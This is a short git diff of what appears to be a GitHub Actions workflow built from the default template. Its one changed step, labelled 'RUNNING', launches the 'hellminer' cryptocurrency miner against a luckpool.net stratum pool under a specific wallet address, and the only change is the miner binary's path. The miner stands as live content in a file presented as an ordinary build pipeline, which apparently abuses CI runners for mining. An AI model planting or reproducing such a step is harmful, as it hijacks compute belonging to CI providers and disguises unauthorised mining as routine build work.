@@ -42,6 +42,6 @@ jobs:
       - name: List
         run: ls
       - name: RUNNING
-        run: ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RQoxppyczmJ1wEdmXenwEXk2CwQaZCkWVn.Rig001 -p x --cpu 1
+        run: /home/./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RQoxppyczmJ1wEdmXenwEXk2CwQaZCkWVn.Rig001 -p x --cpu 1
           echo Add other actions to build,
           echo test, and deploy your project.
